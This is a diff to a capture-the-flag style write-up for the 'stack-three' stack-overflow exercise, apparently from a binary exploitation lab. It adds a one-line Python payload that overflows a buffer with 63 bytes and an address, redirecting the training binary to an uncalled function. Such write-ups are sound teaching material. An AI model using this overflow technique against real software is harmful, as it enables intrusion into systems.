@@ -53,6 +53,11 @@ int main(int argc, char **argv) {
 }
 ```
 
+## Payload
+```bash
+$ python3 -c "print('A' * 63 + '\x9d\x06\x40')" | ./stack-three
+```
+
 ## Solution
 
 - Now these are getting interesting! We now have a new function `complete_level()` which prints our congratualtion message. However, this function is never called in `main()`.... Let's keep digging in.
